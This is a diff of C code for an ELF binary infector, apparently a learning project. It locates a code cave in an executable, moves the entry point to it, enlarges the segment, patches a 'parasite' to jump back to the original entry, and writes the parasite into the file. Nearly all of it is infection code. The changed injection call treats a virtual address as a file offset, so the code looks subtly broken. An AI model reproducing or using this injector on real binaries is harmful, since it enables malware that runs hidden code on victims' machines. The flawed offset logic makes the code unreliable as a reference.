@@ -83,13 +83,14 @@ Elf64_Phdr *find_cave( Elf64_Ehdr *elf_h, Elf64_Phdr *phdr, const long opcode_le
 	return (NULL);
 }
 
-void	modify_entrypoint( Elf64_Ehdr *ehdr, Elf64_Phdr *phdr, const long opcode_len )
+void	modify_entrypoint( Elf64_Ehdr *ehdr, Elf64_Phdr *cave_segment, const long parasite_len )
 {
 	write(STDOUT_FILENO, "Generating new entry point ... ", 31);
-	(void) opcode_len;
-	ehdr->e_entry = (Elf64_Addr)ehdr + phdr->p_offset + phdr->p_filesz;
+	ehdr->e_entry = (Elf64_Addr)(cave_segment->p_vaddr + cave_segment->p_filesz);
 	write(STDOUT_FILENO, "OK\n", 3);
 	printf("New entry point is -> 0x%lx\n", ehdr->e_entry);
+	cave_segment->p_filesz += parasite_len;
+	cave_segment->p_memsz += parasite_len;
 }
 
 void	modify_parasite_jmp( const Elf64_Addr original_entry, uint8_t *parasite_code, const long parasite_len )
@@ -136,10 +137,13 @@ void	inject_code( void *ptr )
 	if (cave_segment == NULL)
 		goto end_injection;
 	printf("Cave selected is %ld bytes long\n", (cave_segment + 1)->p_offset - (cave_segment->p_offset + cave_segment->p_filesz));
-	modify_entrypoint(ehdr, phdr, parasite_len);
+	modify_entrypoint(ehdr, cave_segment, parasite_len);
+
 	printf("Original entrypoint is 0x%lx | New entrypoint is 0x%lx\n", original_entry, ehdr->e_entry);
 	modify_parasite_jmp(original_entry, parasite_opcode, parasite_len);
-	insert_code(ptr + cave_segment->p_offset + cave_segment->p_filesz, parasite_opcode, parasite_len);
+	printf("Copy parsite at %p\n", ptr + ehdr->e_entry);
+	insert_code(ptr + ehdr->e_entry, parasite_opcode, parasite_len);
+	// insert_code(ptr + cave_segment->p_offset + cave_segment->p_filesz, parasite_opcode, parasite_len);
 	
 	end_injection:
 		free(parasite_opcode);
